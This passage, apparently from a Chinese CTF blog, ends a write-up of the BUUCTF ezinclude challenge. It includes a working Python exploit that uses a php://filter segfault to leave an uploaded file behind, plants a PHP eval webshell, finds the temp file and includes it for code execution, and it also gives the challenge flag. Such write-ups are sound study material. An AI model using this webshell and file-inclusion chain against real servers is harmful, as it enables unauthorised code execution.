+<p><strong>这种 包含 会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在upload_tmp_dir所指定的目录下，不会被删除，这样就能达成getshell的目的。</strong></p>
+<h4 id="根据载荷编写攻击脚本"><a href="#根据载荷编写攻击脚本" class="headerlink" title="根据载荷编写攻击脚本:"></a>根据载荷编写攻击脚本:</h4><h5 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py:"></a>exp.py:</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#python version 2.7</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 上传我们的木马文件到/tmp目录下</span><br>payload = <span class="hljs-string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span><br>Pass_files = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(payload.encode())<br>    &#125;<br>url1 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=index.php&#x27;</span><br><span class="hljs-comment"># 我们设置了post传参请求，同时设置了文件上传参数files,这样就可以通过post请求上传我们的文件了</span><br>r = requests.post(url=url1, files=Pass_files, allow_redirects=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 获取/tmp/目录下我们上传的木马文件</span><br>url2 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/dir.php&#x27;</span><br>r = requests.get(url2)<br>data = re.search(<span class="hljs-string">r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;</span>, r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).group(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;++++++++++++++++++++++&quot;</span>)<br><br><span class="hljs-comment"># 使用文件包含我们的木马文件，然后进行rce</span><br>url3 = <span class="hljs-string">&#x27;http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/flflflflag.php?file=/tmp/&#x27;</span>+data<br>data = &#123;<br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&quot;phpinfo();&quot;</span><br>&#125;<br>r = requests.post(url=url3, data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
+
+<h4 id="访问-dir-php"><a href="#访问-dir-php" class="headerlink" title="访问:dir.php:"></a>访问:dir.php:</h4><p><strong>由于我运行了好几次脚本，所以要用最新生成的文件名:tmp&#x2F;php8dW0yU</strong></p>
+<p><img src="/images/2024-2-18/image-20240206175058318.png" srcset="/img/loading.gif" lazyload alt="image-20240206175058318"></p>
+<h4 id="在flflflflag-php中包含tmp-php8dW0yU："><a href="#在flflflflag-php中包含tmp-php8dW0yU：" class="headerlink" title="在flflflflag.php中包含tmp&#x2F;php8dW0yU："></a>在flflflflag.php中包含tmp&#x2F;php8dW0yU：</h4><p><strong>等效于将该文件嵌入flflflflag.php中，即使tmp&#x2F;php8dW0yU没有后缀名，但是由于include()包含，flflflflag.php是主文件，所以也可以使tmp&#x2F;php8dW0yU文件的内容按照主文件的格式运行。</strong></p>
+<p><img src="/images/2024-2-18/image-20240206175712022.png" srcset="/img/loading.gif" lazyload alt="image-20240206175712022"></p>
+<p>flag&#x3D;flag{62950e2d-8c41-4734-896d-985a6529576b}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF_[NPUCTF2020]ezinclude</div>
+      <div>http://example.com/2024/02/18/2024-02-18-[NPUCTF2020]ezinclude/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>South</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/18/2024-02-18-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/" title="BUUCTF_[网鼎杯 2018]Comment">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF_[网鼎杯 2018]Comment</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/18/2023-08-20-%5BNCTF2019%5DSQLi/" title="BUUCTF_[NCTF2019]SQLi">
+                        <span class="hidden-mobile">BUUCTF_[NCTF2019]SQLi</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","appKey":"PmUqfFPhyiQDRYmHOO0IXjTV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
